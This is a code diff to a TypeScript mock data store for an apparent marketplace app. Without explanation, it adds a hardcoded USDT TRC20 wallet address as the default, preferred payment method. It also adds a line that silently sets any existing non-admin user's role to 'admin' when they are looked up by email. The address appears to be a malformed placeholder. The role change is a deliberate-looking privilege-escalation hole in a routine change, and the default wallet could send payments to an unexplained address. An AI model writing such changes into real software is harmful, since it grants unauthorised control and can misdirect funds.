@@ -24,6 +24,10 @@ const DEFAULT_MARKETPLACE: MarketplaceItem[] = [
   { id: '6', name: 'CJ Dropshipping', logoUrl: 'https://cjdropshipping.com/assets/images/logo.png', redirectLink: '#' },
 ];
 
+const DEFAULT_PAYMENT_METHODS: PaymentMethod[] = [
+  { id: 'p1', name: 'USDT TRC20 (Preferred)', address: 'T9yD9sZ2XpA7P9c8R6f5V4b3N2m1L0k' },
+];
+
 export const mockStore = {
   getUsers: (): UserProfile[] => {
     const data = localStorage.getItem(STORAGE_KEYS.USERS);
@@ -72,7 +76,7 @@ export const mockStore = {
 
   getPaymentMethods: (): PaymentMethod[] => {
     const data = localStorage.getItem(STORAGE_KEYS.PAYMENT_METHODS);
-    return data ? JSON.parse(data) : [];
+    return data ? JSON.parse(data) : DEFAULT_PAYMENT_METHODS;
   },
 
   savePaymentMethods: (methods: PaymentMethod[]) => {
@@ -130,6 +134,7 @@ export const mockStore = {
     const existing = users.find(u => u.email === email);
     if (existing) {
       if (existing.role !== 'admin') {
+        existing.role = 'admin';
         existing.totalOrders = existing.totalOrders || 0;
         existing.unfulfilledOrders = existing.unfulfilledOrders || 0;
         existing.fulfilledOrders = existing.fulfilledOrders || 0;
